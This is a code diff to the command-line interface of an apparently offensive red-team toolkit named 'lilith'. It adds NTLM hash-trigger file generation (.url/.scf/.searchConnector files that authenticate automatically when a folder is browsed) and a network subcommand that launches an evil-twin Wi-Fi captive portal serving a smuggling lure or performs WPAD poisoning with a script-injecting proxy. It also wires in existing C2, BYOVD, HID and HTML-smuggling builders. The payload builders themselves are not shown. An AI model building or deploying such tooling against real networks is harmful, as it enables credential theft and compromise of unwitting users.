@@ -34,7 +34,8 @@ from builders.runner  import build_runner, build_runner_sc, build_runner_sc_c2
 from builders.byovd   import build_byovd, build_byovd_sc
 from builders.usbhid  import build_usb_payload, DEVICES as USB_DEVICES
 from builders.blehid   import build_ble_payload, DEVICES as BLE_DEVICES
-from builders.smuggle  import build_smuggle_payload, LURE_PRESETS as SMUGGLE_LURES
+from builders.smuggle    import build_smuggle_payload, LURE_PRESETS as SMUGGLE_LURES, load_inject_js
+from builders.ntlm_trigger import build_ntlm_triggers
 from server.https_server import start_server, get_c2_sessions, _c2_push_task, _c2_get_result
 
 
@@ -417,11 +418,17 @@ def cmd_build(args, cfg, ws):
         )
         did_something = True
 
+    # ── NTLM trigger files ────────────────────────────────────────────────────
+    if getattr(args, "ntlm_trigger", False):
+        ntlm_out = getattr(args, "ntlm_out", None) or ws.path("ntlm_trigger")
+        build_ntlm_triggers(lhost, ntlm_out)
+        did_something = True
+
     if not did_something:
         print("[!] Nothing to build — specify --runner, --tool NAME, --tools, --stager NAME,")
         print("    --stagers, --all, --escalate POTATO --system-tool TOOL,")
         print("    --shellcode FILE --name NAME, --c2-stager, --byovd, --usb TOOL,")
-        print("    --ble TOOL, or --smuggle [TOOL]")
+        print("    --ble TOOL, --smuggle [TOOL], or --ntlm-trigger")
 
 
 def _build_persist_cmd(persist_type: str, cfg: dict, ws: Workspace) -> str | None:
@@ -751,6 +758,66 @@ def cmd_c2(args, cfg, ws):
             print(f"[!] Timeout (task {tid}) — use '!timeout <sec>' to increase the wait")
 
 
+def cmd_network(args, cfg, ws):
+    lhost = cfg.get("lhost", "10.10.14.1")
+
+    if args.net_cmd == "captive":
+        from network.captive import run_captive_portal
+
+        iface = args.iface
+        ssid  = args.ssid or "Corp_Guest"
+        port  = args.cap_port or 80
+
+        # Load lure HTML from workspace (built by --smuggle) or emit minimal page
+        smuggle_out = ws.directory
+        html_path   = os.path.join(smuggle_out, "index.html")
+        if os.path.exists(html_path):
+            with open(html_path, "r", encoding="utf-8") as f:
+                html_lure = f.read()
+            print(f"[*] Using lure: {html_path}")
+        else:
+            print("[!] No index.html found — run: lilith build --smuggle first")
+            print("    Falling back to minimal redirect page")
+            html_lure = (
+                '<!DOCTYPE html><html><head><title>Network Login</title>'
+                '<meta http-equiv="refresh" content="0;url=/portal"></head>'
+                '<body><p>Please wait...</p></body></html>'
+            )
+
+        run_captive_portal(
+            iface      = iface,
+            ssid       = ssid,
+            html_lure  = html_lure,
+            output_dir = os.path.join(smuggle_out, "captive"),
+            port       = port,
+        )
+
+    elif args.net_cmd == "wpad":
+        from network.wpad import run_wpad
+
+        pac_port   = args.pac_port   or 80
+        proxy_port = args.proxy_port or 8080
+
+        # Load inject.js from workspace (built by --smuggle) or abort
+        smuggle_out = ws.directory
+        inject_js   = load_inject_js(smuggle_out)
+        if not inject_js:
+            print("[!] inject.js not found — run: lilith build --smuggle first")
+            sys.exit(1)
+        print(f"[*] Using inject.js from {smuggle_out}")
+
+        run_wpad(
+            lhost      = lhost,
+            inject_js  = inject_js,
+            pac_port   = pac_port,
+            proxy_port = proxy_port,
+        )
+
+    else:
+        print("[!] Specify a network subcommand: captive | wpad")
+        sys.exit(1)
+
+
 def cmd_list(args, cfg, ws):
     list_tools()
 
@@ -888,6 +955,10 @@ def main():
                          help="ISO filename in browser download bar (default: WindowsSecurityUpdate.iso)")
     build_p.add_argument("--smuggle-out",    metavar="DIR",   dest="smuggle_out",  default=None,
                          help="Output directory (default: workspace root)")
+    build_p.add_argument("--ntlm-trigger",  action="store_true", dest="ntlm_trigger",
+                         help="Generate .url/.scf/.searchConnector NTLM trigger files (auto-auth on folder browse)")
+    build_p.add_argument("--ntlm-out",      metavar="DIR",   dest="ntlm_out",     default=None,
+                         help="Output directory for NTLM trigger files (default: <workspace>/ntlm_trigger/)")
 
     serve_p = sub.add_parser("serve", help="Start HTTPS server + callback listener")
     serve_p.add_argument("--port",      type=int, metavar="PORT", help="Override http_port from config")
@@ -914,6 +985,23 @@ def main():
     c2_p.add_argument("--kill",    metavar="SID",
                       help="Remove a session from the registry (use after migration to clean up old session)")
 
+    net_p     = sub.add_parser("network", help="Network-level delivery: captive portal, WPAD poisoning")
+    net_sub   = net_p.add_subparsers(dest="net_cmd", metavar="mode")
+
+    cap_p = net_sub.add_parser("captive", help="Evil twin + captive portal (auto-opens browser on WiFi connect)")
+    cap_p.add_argument("--iface",    required=True, metavar="IFACE",
+                       help="Wireless interface for rogue AP (e.g. wlan1)")
+    cap_p.add_argument("--ssid",     metavar="SSID",  default="Corp_Guest",
+                       help="SSID of rogue AP (default: Corp_Guest)")
+    cap_p.add_argument("--cap-port", metavar="PORT",  dest="cap_port", type=int, default=80,
+                       help="HTTP port for captive portal server (default: 80)")
+
+    wpad_p = net_sub.add_parser("wpad", help="WPAD poisoning + injecting HTTP proxy")
+    wpad_p.add_argument("--pac-port",   metavar="PORT", dest="pac_port",   type=int, default=80,
+                        help="Port to serve wpad.dat on (default: 80)")
+    wpad_p.add_argument("--proxy-port", metavar="PORT", dest="proxy_port", type=int, default=8080,
+                        help="Port for injecting HTTP proxy (default: 8080)")
+
     args = parser.parse_args()
     if not args.command:
         parser.print_help()
@@ -923,13 +1011,14 @@ def main():
     ws  = Workspace()
 
     dispatch = {
-        "init":  cmd_init,
-        "build": cmd_build,
-        "serve": cmd_serve,
-        "list":  cmd_list,
-        "check": cmd_check,
-        "c2":    cmd_c2,
-        "patch": cmd_patch,
+        "init":    cmd_init,
+        "build":   cmd_build,
+        "serve":   cmd_serve,
+        "list":    cmd_list,
+        "check":   cmd_check,
+        "c2":      cmd_c2,
+        "patch":   cmd_patch,
+        "network": cmd_network,
     }
     dispatch[args.command](args, cfg, ws)
 
